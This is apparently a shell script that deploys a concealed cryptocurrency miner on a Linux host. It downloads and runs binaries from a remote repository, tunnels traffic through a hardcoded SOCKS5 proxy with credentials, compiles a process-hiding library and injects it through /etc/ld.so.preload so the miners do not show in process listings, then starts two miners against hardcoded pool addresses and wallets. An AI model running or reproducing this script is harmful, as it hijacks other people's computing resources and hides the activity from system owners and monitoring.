#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81

chmod 777 lol1.81

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 68.183.159.42:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.2412:80 -u pyrin:qp4q02w0j7he7rft0xa7r6g20ph2u7sr4wl0tgcvpwtceu4vkwmnym7ec6faq.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 165.227.180.199:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t90